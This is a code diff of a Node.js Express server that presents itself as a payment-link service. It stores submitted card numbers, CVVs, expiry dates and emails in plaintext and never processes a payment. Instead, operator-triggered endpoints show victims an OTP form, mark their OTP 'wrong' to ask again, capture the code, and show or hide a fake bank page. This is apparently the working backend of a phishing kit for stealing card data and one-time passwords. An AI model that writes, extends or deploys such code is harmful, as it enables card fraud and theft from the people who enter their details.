@@ -4,41 +4,34 @@ import cors from 'cors';
 import crypto from 'crypto';
 import { Server } from 'socket.io';
 
-// Create Express app
 const app = express();
-
-// Configure middlewares
 app.use(bodyParser.json());
-app.use(cors());
+app.use(cors({
+  origin: '*',
+  methods: ['GET', 'POST']
+}));
 app.use(express.static("."));
 
-// Create HTTP server
 const PORT = process.env.PORT || 3000;
 const server = app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
 
-// Initialize Socket.IO
 const io = new Server(server);
-
-// In-memory storage
 const transactions = new Map();
 const paymentLinks = new Map();
 
-// ======================== API ENDPOINTS ========================
-
-// Generate Payment Link
-// Generate Payment Link Endpoint
+// Payment Links Endpoints
 app.post('/api/generatePaymentLink', (req, res) => {
   try {
     const { amount, description } = req.body;
-
+    
     if (!amount || isNaN(amount) || amount <= 0) {
-      return res.status(400).json({ status: "error", message: "Invalid amount. Must be a positive number" });
+      return res.status(400).json({ status: "error", message: "Invalid amount" });
     }
-
-    if (!description || !description.trim()) {
-      return res.status(400).json({ status: "error", message: "Description cannot be empty" });
+    
+    if (!description?.trim()) {
+      return res.status(400).json({ status: "error", message: "Description required" });
     }
 
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
@@ -53,207 +46,154 @@ app.post('/api/generatePaymentLink', (req, res) => {
     });
 
     res.json({ status: "success", paymentLink });
-
   } catch (error) {
     console.error('Payment Link Error:', error);
-    res.status(500).json({ status: "error", message: "Internal server error. Please check server logs." });
+    res.status(500).json({ status: "error", message: "Internal server error" });
   }
 });
 
-
-
-// Get Payment Details
 app.get('/api/getPaymentDetails', (req, res) => {
   const { pid } = req.query;
   if (!pid || !paymentLinks.has(pid)) {
-    return res.status(404).json({ status: "error", message: "Payment details not found" });
+    return res.status(404).json({ status: "error", message: "Not found" });
   }
-  const payment = paymentLinks.get(pid);
-  res.json({ status: "success", payment });
+  res.json({ status: "success", payment: paymentLinks.get(pid) });
 });
 
-// Get Transaction Details
-app.get('/api/getTransactionDetails', (req, res) => {
-  const { invoiceId } = req.query;
-  const txn = transactions.get(invoiceId);
-  if (!txn) {
-    return res.status(404).json({ status: "error", message: "Transaction details not found" });
-  }
-  res.json(txn);
-});
-
-// Get All Transactions
-app.get('/api/transactions', (req, res) => {
-  const txList = Array.from(transactions.values());
-  res.json(txList);
-});
-
-// Process Payment
-// server.js - Fix the duplicate response in sendPaymentDetails
+// Transactions Endpoints
 app.post('/api/sendPaymentDetails', (req, res) => {
-  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
-  
-  // Add validation
-  if (!cardNumber || !expiry || !cvv || !email || !amount || !cardholder) {
-    return res.status(400).json({ status: "error", message: "Missing required fields" });
-  }
+  try {
+    const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
+    
+    if (!cardNumber || !expiry || !cvv || !email || !amount || !cardholder) {
+      return res.status(400).json({ status: "error", message: "Missing fields" });
+    }
 
-  const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase(); // Increased to 8 bytes for better uniqueness
-  
-  const transaction = {
-    id: invoiceId,
-    cardNumber,
-    expiry,
-    cvv,
-    email,
-    amount: amount.toString().replace(/,/g, ''),
-    currency,
-    cardholder,
-    status: 'processing',
-    otp: null,
-    otpShown: false,
-    otpEntered: null,
-    otpError: false,
-    redirectStatus: null,
-    bankpageVisible: false,
-    timestamp: new Date().toLocaleString()
-  };
-  
-  transactions.set(invoiceId, transaction);
-  console.log("New transaction recorded:", transaction);
-  
-  // Emit socket event before sending response
-  io.emit('new_transaction', invoiceId);
-  
-  // Send single response
-  res.json({ status: "success", invoiceId });
+    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
+    
+    const transaction = {
+      id: invoiceId,
+      cardNumber,
+      expiry,
+      cvv,
+      email,
+      amount: amount.toString().replace(/,/g, ''),
+      currency,
+      cardholder,
+      status: 'processing',
+      otpShown: false,
+      otpEntered: null,
+      otpError: false,
+      redirectStatus: null,
+      bankpageVisible: false,
+      timestamp: new Date().toLocaleString()
+    };
+    
+    transactions.set(invoiceId, transaction);
+    io.emit('new_transaction');
+    res.json({ status: "success", invoiceId });
+  } catch (error) {
+    console.error('Transaction Error:', error);
+    res.status(500).json({ status: "error", message: "Payment processing failed" });
+  }
 });
 
-// Show OTP
+app.get('/api/transactions', (req, res) => {
+  res.json(Array.from(transactions.values()));
+});
+
 app.post('/api/showOTP', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
-  if (!txn) {
-    return res.status(404).json({ status: "error", message: "Transaction not found" });
-  }
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+  
   txn.otpShown = true;
   txn.status = 'otp_pending';
   txn.otpError = false;
-  res.json({ status: "success", message: "OTP form will be shown to user" });
+  res.json({ status: "success", message: "OTP form shown" });
 });
 
-// Mark Wrong OTP
 app.post('/api/wrongOTP', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
-  if (!txn) {
-    return res.status(404).json({ status: "error", message: "Transaction not found" });
-  }
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+  
   txn.otpError = true;
   txn.status = 'otp_pending';
-  res.json({ status: "success", message: "OTP marked as wrong" });
+  res.json({ status: "success", message: "OTP marked wrong" });
 });
 
-// Check Transaction Status
 app.get('/api/checkTransactionStatus', (req, res) => {
   const { invoiceId } = req.query;
   const txn = transactions.get(invoiceId);
-  if (!txn) {
-    return res.status(404).json({ status: "error", message: "Transaction details not found" });
-  }
-  
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+
   if (txn.status === 'otp_pending' && txn.otpShown) {
     return res.json({ 
       status: "show_otp", 
-      message: "Show OTP form to user", 
+      message: "Show OTP form",
       otpError: txn.otpError 
     });
   }
-  
+
   if (txn.redirectStatus) {
-    let redirectUrl;
-    if (txn.redirectStatus === 'success') {
-      redirectUrl = `/success.html?invoiceId=${invoiceId}`;
-    } else if (txn.redirectStatus === 'fail') {
-      redirectUrl = `/fail.html?invoiceId=${invoiceId}`;
-    } else if (txn.redirectStatus === 'bankpage') {
-      redirectUrl = `/bankpage.html?invoiceId=${invoiceId}`;
-    }
-    return res.json({ status: "redirect", redirectUrl });
+    const redirectUrls = {
+      success: `/success.html?invoiceId=${invoiceId}`,
+      fail: `/fail.html?invoiceId=${invoiceId}`,
+      bankpage: `/bankpage.html?invoiceId=${invoiceId}`
+    };
+    return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
   }
-  
+
   res.json({ status: txn.status, otpError: txn.otpError });
 });
 
-// Submit OTP
 app.post('/api/submitOTP', (req, res) => {
   const { invoiceId, otp } = req.body;
   const txn = transactions.get(invoiceId);
-  if (!txn) {
-    return res.status(404).json({ status: "error", message: "Transaction not found" });
-  }
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+  
   txn.otpEntered = otp;
   txn.status = 'otp_received';
   txn.otpError = false;
-  console.log(`OTP received for transaction ${invoiceId}: ${otp}`);
   res.json({ status: "success", message: "OTP received" });
 });
 
-// Update Redirect Status
 app.post('/api/updateRedirectStatus', (req, res) => {
   const { invoiceId, redirectStatus } = req.body;
   const txn = transactions.get(invoiceId);
-  if (!txn) {
-    return res.status(404).json({ status: "error", message: "Transaction not found" });
-  }
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+  
   txn.redirectStatus = redirectStatus;
-  console.log(`Transaction ${invoiceId} redirect status updated to: ${redirectStatus}`);
   res.json({
     status: "success",
     invoiceId,
     redirectStatus,
-    redirectUrl: redirectStatus === 'success'
-      ? `/success.html?invoiceId=${invoiceId}`
-      : redirectStatus === 'fail'
-      ? `/fail.html?invoiceId=${invoiceId}`
-      : `/bankpage.html?invoiceId=${invoiceId}`
+    redirectUrl: `/bankpage.html?invoiceId=${invoiceId}`
   });
 });
 
-// Redirect to Bank Page
-app.post('/api/redirectToBankPage', (req, res) => {
-  const { invoiceId } = req.body;
-  const txn = transactions.get(invoiceId);
-  if (!txn) {
-    return res.status(404).json({ status: "error", message: "Transaction not found" });
-  }
-  txn.redirectStatus = 'bankpage';
-  console.log(`Transaction ${invoiceId} redirected to bank page`);
-  res.json({ status: "success", message: "Redirecting to bank page" });
-});
-
-// Show Bank Page
 app.post('/api/showBankpage', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
   if (!txn) return res.status(404).json({ error: 'Transaction not found' });
+  
   txn.redirectStatus = 'bankpage';
   txn.bankpageVisible = true;
   res.json({ status: 'success' });
 });
 
-// Hide Bank Page
 app.post('/api/hideBankpage', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
   if (!txn) return res.status(404).json({ error: 'Transaction not found' });
+  
   txn.redirectStatus = null;
   txn.bankpageVisible = false;
   io.to(invoiceId).emit('hide_bankpage');
   res.json({ status: 'success' });
 });
 
-// ======================== SOCKET.IO HANDLERS ========================
 io.on('connection', (socket) => {
   socket.on('join', (invoiceId) => {
     socket.join(invoiceId);
